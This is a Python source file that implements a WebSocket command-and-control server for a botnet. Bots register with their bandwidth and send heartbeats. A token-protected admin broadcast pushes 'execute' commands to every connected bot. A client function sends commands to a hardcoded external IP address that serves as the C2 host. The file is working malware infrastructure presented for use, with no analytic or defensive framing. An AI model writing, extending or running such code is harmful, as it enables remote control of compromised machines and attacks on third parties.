import asyncio
import json
import os
import websockets
import websocket
from utils.logger import log

C2_HOST = "0.0.0.0"
C2_PORT = 8888
KILL_SWITCH_TOKEN = os.environ.get("KILL_TOKEN", "default_kill")

connected_bots = {}

async def handler(websocket, path):
    bot_id = None
    try:
        async for message in websocket:
            data = json.loads(message)
            cmd = data.get("cmd")
            if cmd == "register":
                bot_id = data["bot_id"]
                connected_bots[bot_id] = {
                    "ws": websocket,
                    "info": data.get("info", {}),
                    "bandwidth_mbps": data.get("bandwidth", 10),
                    "last_seen": asyncio.get_event_loop().time()
                }
                await websocket.send(json.dumps({"status": "ok"}))
                log(f"[C2] Bot {bot_id} online")
            elif cmd == "heartbeat":
                if bot_id in connected_bots:
                    connected_bots[bot_id]["last_seen"] = asyncio.get_event_loop().time()
            elif cmd == "admin_broadcast":
                if data.get("token") != KILL_SWITCH_TOKEN:
                    await websocket.send(json.dumps({"status": "error", "reason": "bad token"}))
                    continue
                payload = data["payload"]
                await broadcast_to_bots(payload)
                await websocket.send(json.dumps({"status": "ok"}))
    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        if bot_id and bot_id in connected_bots:
            del connected_bots[bot_id]
            log(f"[C2] Bot {bot_id} offline")

async def broadcast_to_bots(message_dict):
    if not connected_bots:
        return
    msg = json.dumps({"cmd": "execute", "data": message_dict})
    await asyncio.wait([bot["ws"].send(msg) for bot in connected_bots.values()])

async def start_server():
    log(f"[C2] WebSocket C2 запущен на порту {C2_PORT}")
    async with websockets.serve(handler, C2_HOST, C2_PORT):
        await asyncio.Future()

def _load_c2_settings():
    try:
        with open("avz_settings.json", "r") as f:
            settings = json.load(f)
    except:
        settings = {}
    host = settings.get("c2_host", "80.249.146.202")
    port = settings.get("c2_port", 8888)
    token = settings.get("kill_switch_token", KILL_SWITCH_TOKEN)
    return host, port, token

def broadcast_command(command_dict):
    host, port, token = _load_c2_settings()
    ws_url = f"ws://{host}:{port}"
    try:
        ws = websocket.create_connection(ws_url, timeout=5)
        msg = json.dumps({
            "cmd": "admin_broadcast",
            "token": token,
            "payload": command_dict
        })
        ws.send(msg)
        response = ws.recv()
        ws.close()
        log(f"[C2 Client] Команда отправлена, ответ: {response}")
        return True
    except Exception as e:
        log(f"[C2 Client] Ошибка: {e}")
        return False

if __name__ == "__main__":
    asyncio.run(start_server())
